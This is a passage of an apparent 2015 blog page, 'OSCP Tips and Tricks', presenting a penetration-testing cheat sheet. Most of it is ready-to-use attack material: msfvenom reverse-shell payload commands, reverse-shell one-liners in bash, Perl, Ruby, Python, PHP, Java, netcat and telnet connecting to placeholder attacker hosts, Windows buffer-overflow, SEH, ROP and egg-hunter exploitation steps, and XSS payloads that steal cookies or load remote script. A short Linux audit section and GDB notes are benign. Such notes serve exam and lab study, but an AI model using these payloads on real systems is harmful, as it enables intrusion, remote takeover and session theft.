+<div class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -e -f elf -a x86 --platform linux -o shell</code></pre></div>
+
+<h3 id="msf-reverse-shell-c-shellcode">MSF Reverse Shell (C Shellcode)</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -b <span class="s2">&quot;\x00\x0a\x0d&quot;</span> -a x86 --platform win -f c</code></pre></div>
+
+<h3 id="msf-reverse-shell-python-script">MSF Reverse Shell Python Script</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom -p cmd/unix/reverse_python <span class="nv">LHOST</span><span class="o">=</span>127.0.0.1 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -o shell.py</code></pre></div>
+
+<h3 id="msf-reverse-asp-shell">MSF Reverse ASP Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f asp -a x86 --platform win -o shell.asp</code></pre></div>
+
+<h3 id="msf-reverse-bash-shell">MSF Reverse Bash Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom -p cmd/unix/reverse_bash <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -o shell.sh</code></pre></div>
+
+<h3 id="msf-reverse-php-shell">MSF Reverse PHP Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom -p php/meterpreter_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -o shell.php
+add &lt;?php at the beginning
+perl -i~ -0777pe<span class="s1">&#39;s/^/&lt;?php \n/&#39;</span> shell.php</code></pre></div>
+
+<h3 id="msf-reverse-win-bin">MSF Reverse Win Bin</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;Your IP Address&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;Your Port to Connect On&gt; -f exe -a x86 --platform win -o shell.exe</code></pre></div>
+
+<h3 id="linux-security-commands">Linux Security Commands</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># find programs with a set uid bit</span>
+find / -uid <span class="m">0</span> -perm -4000
+ 
+<span class="c"># find things that are world writable</span>
+find / -perm -o<span class="o">=</span>w
+ 
+<span class="c"># find names with dots and spaces, there shouldn’t be any</span>
+find / -name <span class="s2">&quot; &quot;</span> -print
+find / -name <span class="s2">&quot;..&quot;</span> -print
+find / -name <span class="s2">&quot;. &quot;</span> -print
+find / -name <span class="s2">&quot; &quot;</span> -print
+ 
+<span class="c"># find files that are not owned by anyone</span>
+find / -nouser
+ 
+<span class="c"># look for files that are unlinked</span>
+lsof +L1
+ 
+<span class="c"># get information about procceses with open ports</span>
+lsof -i
+
+<span class="c"># look for weird things in arp</span>
+arp -a
+ 
+<span class="c"># look at all accounts including AD</span>
+getent passwd
+ 
+<span class="c"># look at all groups and membership including AD</span>
+getent group
+ 
+<span class="c"># list crontabs for all users including AD</span>
+<span class="k">for</span> user in <span class="k">$(</span>getent passwd<span class="p">|</span>cut -f1 -d:<span class="k">)</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="s2">&quot;### Crontabs for $user ####&quot;</span><span class="p">;</span> crontab -u <span class="nv">$user</span> -l<span class="p">;</span> <span class="k">done</span>
+ 
+<span class="c"># generate random passwords</span>
+cat /dev/urandom<span class="p">|</span> tr -dc ‘a-zA-Z0-9-_!@#<span class="nv">$%</span>^<span class="p">&amp;</span>*<span class="o">()</span>_+<span class="o">{}</span><span class="p">|</span>:&lt;&gt;?<span class="o">=</span>’<span class="p">|</span>fold -w 12<span class="p">|</span> head -n 4
+ 
+<span class="c"># find all immutable files, there should not be any</span>
+find . <span class="p">|</span> xargs -I file lsattr -a file 2&gt;/dev/null <span class="p">|</span> grep ‘^….i’
+ 
+<span class="c"># fix immutable files</span>
+chattr -i file</code></pre></div>
+
+<h3 id="win-buffer-overflow-exploit-commands">Win Buffer Overflow Exploit Commands</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom -p windows/shell_bind_tcp -a x86 --platform win -b <span class="s2">&quot;\x00&quot;</span> -f c
+msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>X.X.X.X <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -a x86 --platform win -e x86/shikata_ga_nai -b <span class="s2">&quot;\x00&quot;</span> -f c
+
+COMMONLY USED BAD CHARACTERS:
+<span class="se">\x</span>00<span class="se">\x</span>0a<span class="se">\x</span>0d<span class="se">\x</span><span class="m">20</span>                              For http request
+<span class="se">\x</span>00<span class="se">\x</span>0a<span class="se">\x</span>0d<span class="se">\x</span>20<span class="se">\x</span>1a<span class="se">\x</span>2c<span class="se">\x</span>2e<span class="se">\3</span>a<span class="se">\x</span>5c           Ending with <span class="o">(</span>0<span class="se">\n\r</span>_<span class="o">)</span>
+
+<span class="c"># Useful Commands:</span>
+pattern create
+pattern offset <span class="o">(</span>EIP Address<span class="o">)</span>
+pattern offset <span class="o">(</span>ESP Address<span class="o">)</span>
+add garbage upto EIP value and add <span class="o">(</span>JMP ESP address<span class="o">)</span> in EIP . <span class="o">(</span><span class="nv">ESP</span> <span class="o">=</span> shellcode <span class="o">)</span>
+ 
+!pvefindaddr pattern_create 5000
+!pvefindaddr suggest
+!pvefindaddr modules
+!pvefindaddr nosafeseh
+ 
+!mona config -set workingfolder C:<span class="se">\M</span>ona<span class="se">\%</span>p
+!mona config -get workingfolder
+!mona mod
+!mona bytearray -b <span class="s2">&quot;\x00\x0a&quot;</span>
+!mona pc 5000
+!mona po EIP
+!mona suggest</code></pre></div>
+
+<h3 id="seh---structured-exception-handling">SEH - Structured Exception Handling</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
+!mona suggest
+!mona nosafeseh
+<span class="nv">nseh</span><span class="o">=</span><span class="s2">&quot;\xeb\x06\x90\x90&quot;</span> <span class="o">(</span>next seh chain<span class="o">)</span>
+<span class="nv">iseh</span><span class="o">=</span> !pvefindaddr p1 -n -o -i <span class="o">(</span>POP POP RETRUN or POPr32,POPr32,RETN<span class="o">)</span></code></pre></div>
+
+<h3 id="rop-dep">ROP (DEP)</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">https://en.wikipedia.org/wiki/Return-oriented_programming
+https://en.wikipedia.org/wiki/Data_Execution_Prevention
+!mona modules
+!mona ropfunc -m *.dll -cpb <span class="s2">&quot;\x00\x09\x0a&quot;</span>
+!mona rop -m *.dll -cpb <span class="s2">&quot;\x00\x09\x0a&quot;</span> <span class="o">(</span>auto suggest<span class="o">)</span></code></pre></div>
+
+<h3 id="aslr---address-space-layout-randomization">ASLR - Address space layout randomization</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">https://en.wikipedia.org/wiki/Address_space_layout_randomization
+!mona noaslr</code></pre></div>
+
+<h3 id="egg-hunter-techniques">EGG Hunter techniques</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
+http://www.fuzzysecurity.com/tutorials/expDev/4.html
+!mona jmp -r esp
+!mona egg -t lxxl
+<span class="se">\x</span>eb<span class="se">\x</span>c4 <span class="o">(</span>jump backward -60<span class="o">)</span>
+<span class="nv">buff</span><span class="o">=</span>lxxllxxl+shell
+!mona egg -t <span class="s1">&#39;w00t&#39;</span></code></pre></div>
+
+<h3 id="gdb-debugger-commands">GDB Debugger Commands</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Setting Breakpoint</span>
+<span class="nb">break</span> *_start
+ 
+<span class="c"># Execute Next Instruction</span>
+next
+step
+n
+s
+ 
+<span class="c"># Continue Execution</span>
+<span class="k">continue</span>
+c
+ 
+<span class="c"># Data</span>
+checking <span class="s1">&#39;REGISTERS&#39;</span> and <span class="s1">&#39;MEMORY&#39;</span>
+
+<span class="c"># Display Register Values: (Decimal,Binary,Hex)</span>
+print /d –&gt; Decimal
+print /t –&gt; Binary
+print /x –&gt; Hex
+O/P :
+<span class="o">(</span>gdb<span class="o">)</span> print /d <span class="nv">$eax</span>
+<span class="nv">$17</span> <span class="o">=</span> 13
+<span class="o">(</span>gdb<span class="o">)</span> print /t <span class="nv">$eax</span>
+<span class="nv">$18</span> <span class="o">=</span> 1101
+<span class="o">(</span>gdb<span class="o">)</span> print /x <span class="nv">$eax</span>
+<span class="nv">$19</span> <span class="o">=</span> 0xd
+<span class="o">(</span>gdb<span class="o">)</span>
+
+<span class="c"># Display values of specific memory locations</span>
+<span class="nb">command</span> : x/nyz <span class="o">(</span>Examine<span class="o">)</span>
+n –&gt; Number of fields to <span class="nv">display</span> <span class="o">==</span>&gt;
+y –&gt; Format <span class="k">for</span> <span class="nv">output</span> <span class="o">==</span>&gt; c <span class="o">(</span>character<span class="o">)</span> , d <span class="o">(</span>decimal<span class="o">)</span> , x <span class="o">(</span>Hexadecimal<span class="o">)</span>
+z –&gt; Size of field to be <span class="nv">displayed</span> <span class="o">==</span>&gt; b <span class="o">(</span>byte<span class="o">)</span> , h <span class="o">(</span>halfword<span class="o">)</span>, w <span class="o">(</span>word <span class="m">32</span> Bit<span class="o">)</span></code></pre></div>
+
+<h3 id="bash-reverse-shell">BASH Reverse Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">bash -i &gt;<span class="p">&amp;</span> /dev/tcp/X.X.X.X/443 0&gt;<span class="p">&amp;</span>1
+ 
+<span class="nb">exec</span> /bin/bash 0<span class="p">&amp;</span><span class="m">0</span> 2&gt;<span class="p">&amp;</span>0
+<span class="nb">exec</span> /bin/bash 0<span class="p">&amp;</span><span class="m">0</span> 2&gt;<span class="p">&amp;</span>0
+ 
+0&lt;<span class="p">&amp;</span>196<span class="p">;</span><span class="nb">exec </span>196&lt;&gt;/dev/tcp/attackerip/4444<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> 2&gt;<span class="p">&amp;</span>196
+ 
+0&lt;<span class="p">&amp;</span>196<span class="p">;</span><span class="nb">exec </span>196&lt;&gt;/dev/tcp/attackerip/4444<span class="p">;</span> sh &lt;<span class="p">&amp;</span><span class="m">196</span> &gt;<span class="p">&amp;</span><span class="m">196</span> 2&gt;<span class="p">&amp;</span>196
+ 
+<span class="nb">exec </span>5&lt;&gt;/dev/tcp/attackerip/4444 cat &lt;<span class="p">&amp;</span><span class="m">5</span> <span class="p">|</span> <span class="k">while</span> <span class="nb">read </span>line<span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> 2&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span>5<span class="p">;</span> <span class="k">done</span> <span class="c"># or: while read line 0&lt;&amp;5; do $line 2&gt;&amp;5 &gt;&amp;5; done</span>
+<span class="nb">exec </span>5&lt;&gt;/dev/tcp/attackerip/4444
+ 
+cat &lt;<span class="p">&amp;</span><span class="m">5</span> <span class="p">|</span> <span class="k">while</span> <span class="nb">read </span>line<span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> 2&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span>5<span class="p">;</span> <span class="k">done</span> <span class="c"># or:</span>
+<span class="k">while</span> <span class="nb">read </span>line 0&lt;<span class="p">&amp;</span>5<span class="p">;</span> <span class="k">do</span> <span class="nv">$line</span> 2&gt;<span class="p">&amp;</span><span class="m">5</span> &gt;<span class="p">&amp;</span>5<span class="p">;</span> <span class="k">done</span>
+ 
+/bin/bash -i &gt; /dev/tcp/attackerip/8080 0&lt;<span class="p">&amp;</span><span class="m">1</span> 2&gt;<span class="p">&amp;</span>1
+/bin/bash -i &gt; /dev/tcp/X.X.X.X/443 0&lt;<span class="p">&amp;</span><span class="m">1</span> 2&gt;<span class="p">&amp;</span>1</code></pre></div>
+
+<h3 id="perl-reverse-shell">PERL Reverse Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">perl -MIO -e <span class="s1">&#39;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:443&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+
+<span class="c"># for win platform</span>
+perl -MIO -e <span class="s1">&#39;$c=new IO::Socket::INET(PeerAddr,&quot;attackerip:4444&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39;</span>
+perl -e <span class="err">&#39;</span>use Socket<span class="p">;</span><span class="nv">$i</span><span class="o">=</span><span class="s2">&quot;10.0.0.1&quot;</span><span class="p">;</span><span class="nv">$p</span><span class="o">=</span>1234<span class="p">;</span>socket<span class="o">(</span>S,PF_INET,SOCK_STREAM,getprotobyname<span class="o">(</span><span class="s2">&quot;tcp&quot;</span><span class="o">))</span><span class="p">;</span><span class="k">if</span><span class="o">(</span>connect<span class="o">(</span>S,sockaddr_in<span class="o">(</span><span class="nv">$p</span>,inet_aton<span class="o">(</span><span class="nv">$i</span><span class="o">)))){</span>open<span class="o">(</span>STDIN,<span class="s2">&quot;&gt;&amp;S&quot;</span><span class="o">)</span><span class="p">;</span>open<span class="o">(</span>STDOUT,<span class="s2">&quot;&gt;&amp;S&quot;</span><span class="o">)</span><span class="p">;</span>open<span class="o">(</span>STDERR,<span class="s2">&quot;&gt;&amp;S&quot;</span><span class="o">)</span><span class="p">;</span><span class="nb">exec</span><span class="o">(</span><span class="s2">&quot;/bin/sh -i&quot;</span><span class="o">)</span><span class="p">;</span><span class="o">}</span><span class="p">;</span>’</code></pre></div>
+
+<h3 id="ruby-reverse-shell">RUBY Reverse Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">ruby -rsocket -e <span class="s1">&#39;exit if fork;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
+ 
+<span class="c"># for win platform</span>
+ruby -rsocket -e <span class="s1">&#39;c=TCPSocket.new(&quot;attackerip&quot;,&quot;443&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;){|io|c.print io.read}end&#39;</span>
+ruby -rsocket -e <span class="s1">&#39;f=TCPSocket.open(&quot;attackerip&quot;,&quot;443&quot;).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&#39;</span></code></pre></div>
+
+<h3 id="python-reverse-shell">PYTHON Reverse Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;attackerip&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</span></code></pre></div>
+
+<h3 id="php-reverse-shell">PHP Reverse Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">php -r <span class="s1">&#39;$sock=fsockopen(&quot;attackerip&quot;,443);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</span></code></pre></div>
+
+<h3 id="java-reverse-shell">JAVA Reverse Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">r</span> <span class="o">=</span> Runtime.getRuntime<span class="o">()</span>
+<span class="nv">p</span> <span class="o">=</span> r.exec<span class="o">([</span><span class="s2">&quot;/bin/bash&quot;</span>,<span class="s2">&quot;-c&quot;</span>,<span class="s2">&quot;exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span><span class="o">]</span> as String<span class="o">[])</span>
+p.waitFor<span class="o">()</span></code></pre></div>
+
+<h3 id="netcat-reverse-shell">NETCAT Reverse Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">nc -e /bin/sh attackerip 4444
+nc -e /bin/sh 192.168.37.10 443
+ 
+<span class="c"># If the -e option is disabled, try this </span>
+<span class="c"># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span>
+/bin/sh <span class="p">|</span> nc attackerip 443
+rm -f /tmp/p<span class="p">;</span> mknod /tmp/p p <span class="o">&amp;&amp;</span> nc attackerip <span class="m">4443</span> 0/tmp/
+ 
+<span class="c"># If you have the wrong version of netcat installed, try </span>
+rm /tmp/f<span class="p">;</span>mkfifo /tmp/f<span class="p">;</span>cat /tmp/f<span class="p">|</span>/bin/sh -i 2&gt;<span class="p">&amp;</span>1<span class="p">|</span>nc attackerip &gt;/tmp/f</code></pre></div>
+
+<h3 id="telnet-reverse-shell">TELNET Reverse Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># If netcat is not available or /dev/tcp</span>
+mknod backpipe p <span class="o">&amp;&amp;</span> telnet attackerip <span class="m">443</span> 0&lt;backpipe <span class="p">|</span> /bin/bash 1&gt;backpipe</code></pre></div>
+
+<h3 id="xterm-reverse-shell">XTERM Reverse Shell</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Start an open X Server on your system (:1 – which listens on TCP port 6001)</span>
+apt-get install xnest
+Xnest :1
+ 
+<span class="c"># Then remember to authorise on your system the target IP to connect to you</span>
+xterm -display 127.0.0.1:1
+
+<span class="c"># Run this INSIDE the spawned xterm on the open X Server</span>
+xhost +targetip 
+ 
+<span class="c"># Then on the target connect back to the your X Server</span>
+xterm -display attackerip:1
+/usr/openwin/bin/xterm -display attackerip:1
+or
+<span class="nv">$ DISPLAY</span><span class="o">=</span>attackerip:0 xterm</code></pre></div>
+
+<h3 id="xss-cheat-codes">XSS Cheat Codes</h3>
+
+<div class="highlight"><pre><code class="language-bash" data-lang="bash">https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
+<span class="o">(</span><span class="s2">&quot;&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;&quot;</span><span class="o">)</span>
+ 
+&lt;script&gt;document.location<span class="o">=</span>http://IP:PORT&lt;/script&gt;
+ 
+<span class="s1">&#39;;alert(String.fromCharCode(88,83,83))//\&#39;;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//\&quot;;alert(String.fromCharCode(88,83,83))//–&gt;&lt;/SCRIPT&gt;&quot;&gt;&#39;</span>&gt;&lt;SCRIPT&gt;alert<span class="o">(</span>String.fromCharCode<span class="o">(</span>88,83,83<span class="o">))</span>&lt;/SCRIPT&gt;
+ 
+<span class="s2">&quot;;!–&quot;</span>&lt;XSS&gt;<span class="o">=</span><span class="p">&amp;</span>amp<span class="p">;</span>amp<span class="p">;</span><span class="o">{()}</span>
+ 
+&lt;IMG <span class="nv">SRC</span><span class="o">=</span><span class="s2">&quot;javascript:alert(&#39;XSS&#39;);&quot;</span>&gt;
+&lt;IMG <span class="nv">SRC</span><span class="o">=</span>javascript:alert<span class="o">(</span><span class="s1">&#39;XSS&#39;</span><span class="o">)</span>&gt;
+&lt;IMG <span class="s2">&quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;</span>XSS<span class="s2">&quot;)&lt;/SCRIPT&gt;&quot;&quot;&gt;</span>
+<span class="s2">&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;</span>
+<span class="s2"> </span>
+<span class="s2">&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;</span>
+<span class="s2">&lt;IMG SRC=&quot;</span>jav ascript:alert<span class="o">(</span><span class="s1">&#39;XSS&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;&gt;</span>
+<span class="s2"> </span>
+<span class="s2">perl -e &#39;print &quot;</span>&lt;IMG <span class="nv">SRC</span><span class="o">=</span>javascript:alert<span class="o">(</span><span class="se">\&quot;</span>XSS<span class="se">\&quot;</span><span class="o">)</span>&gt;<span class="s2">&quot;;&#39; &gt; out</span>
+<span class="s2"> </span>
+<span class="s2">&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;</span>XSS<span class="s2">&quot;)&gt;</span>
+
+<span class="s2">(&quot;</span>&gt;&lt; iframes http://google.com &lt; iframes &gt;<span class="o">)</span>
+ 
+&lt;BODY <span class="nv">BACKGROUND</span><span class="o">=</span><span class="s2">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span>&gt;
+&lt;FRAMESET&gt;&lt;FRAME <span class="nv">SRC</span><span class="o">=</span>”javascript:alert<span class="o">(</span><span class="s1">&#39;XSS&#39;</span><span class="o">)</span><span class="p">;</span><span class="s2">&quot;&gt;&lt;/FRAMESET&gt;</span>
+<span class="s2">&quot;</span>&gt;&lt;script &gt;alert<span class="o">(</span>document.cookie<span class="o">)</span>&lt;/script&gt;
+%253cscript%253ealert<span class="o">(</span>document.cookie<span class="o">)</span>%253c/script%253e
+<span class="s2">&quot;&gt;&lt;s&quot;</span>%2b<span class="err">&quot;</span>cript&gt;alert<span class="o">(</span>document.cookie<span class="o">)</span>&lt;/script&gt;
+%22/%3E%3CBODY%20onload<span class="o">=</span>’document.write<span class="o">(</span>%22%3Cs%22%2b%22cript%20src<span class="o">=</span>http://my.box.com/xss.js%3E%3C/script%3E%22<span class="o">)</span><span class="err">&#39;</span>%3E
+&lt;img <span class="nv">src</span><span class="o">=</span>asdf <span class="nv">onerror</span><span class="o">=</span>alert<span class="o">(</span>document.cookie<span class="o">)</span>&gt;</code></pre></div>
+
+
+      <hr />
+      <footer role="contentinfo">
+        <div class="article-author-bottom">
+          
+
+
+
+	<img src="https://jivoi.github.io/images/avatar.jpg" class="bio-photo" alt="EK bio photo">
+
+<h3>EK</h3>
+<p>I'm a hacker and security researcher</p>
+<a href="mailto:ekoz@protonmail.com" class="author-widgets" target="_blank"><i class="fa fa-fw fa-envelope-square"></i> Email</a>
+<a href="http://twitter.com/jivoi" class="author-widgets" target="_blank"><i class="fa fa-fw fa-tw-square"></i> Twitter</a>
+
+
+
+
+
+<a href="http://github.com/jivoi" class="author-widgets" target="_blank"><i class="fa fa-fw fa-github"></i> Github</a>
+
+
+
+
+
+
+
+
+
+
+        </div>
+        <p class="byline"><strong>OSCP Tips and Tricks</strong> was published on <time datetime="2015-07-01T00:00:00+03:00">July 01, 2015</time> and last modified on <time datetime="2015-07-01">July 01, 2015</time>.</p>
+      </footer>
+    </div><!-- /.article-wrap -->
+  
+    <section id="disqus_thread"></section><!-- /#disqus_thread -->
+  
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrap">
+  <div class="related-articles">
+  <h4>You might also enjoy <small class="pull-right">(<a href="https://jivoi.github.io/archive/">View all posts</a>)</small></h4>
+    <ul>
+    
+      <li><a href="https://jivoi.github.io/2015/06/29/otpw-in-linux-with-ssh/" title="OTPW in Linux with SSH">OTPW in Linux with SSH</a></li>
+    
+      <li><a href="https://jivoi.github.io/2015/06/29/linux-unix-it-tips-and-tricks-number-2/" title="Linux-Unix-IT Tips and Tricks #2">Linux-Unix-IT Tips and Tricks #2</a></li>
+    
+      <li><a href="https://jivoi.github.io/2015/06/26/huawei-e392-with-linux/" title="4G Huawei E392 with Linux">4G Huawei E392 with Linux</a></li>
+    
+    </ul>
+    <hr />
+  </div><!-- /.related-articles -->
+  <footer>
+    
+
+  </footer>
+</div><!-- /.footer-wrap -->
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="https://jivoi.github.io/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="https://jivoi.github.io/assets/js/scripts.min.js"></script>
+
+<!-- Start of StatCounter Code for Default Guide -->
+<script type="text/javascript">
+var sc_project=2435245; 
+var sc_invisible=1; 
+var sc_security="015e0a49"; 
+</script>
+<script type="text/javascript" src="http://www.statcounter.com/counter/counter.js"></script>
+<noscript><div class="statcounter"><a title="free hitcounter" href="http://statcounter.com/" target="_blank"><img class="statcounter" src="http://c.statcounter.com/2435245/0/015e0a49/1/" alt="free hit counter"></a></div></noscript>
+<!-- End of StatCounter Code for Default Guide -->
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  var _gaq = _gaq || [];
+  var pluginUrl = 
+ '//www.google-analytics.com/plugins/ga/inpage_linkid.js';
+  _gaq.push(['_require', 'inpage_linkid', pluginUrl]);
+  _gaq.push(['_setAccount', 'UA-64125092-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+
+
+  
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'httpjivoigithubcom'; // required: replace example with your forum shortname
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function () {
+        var s = document.createElement('script'); s.async = true;
+        s.type = 'text/javascript';
+        s.src = '//' + disqus_shortname + '.disqus.com/count.js';
+        (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
+    }());
+</script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+
+	        
+
+</body>
+</html>
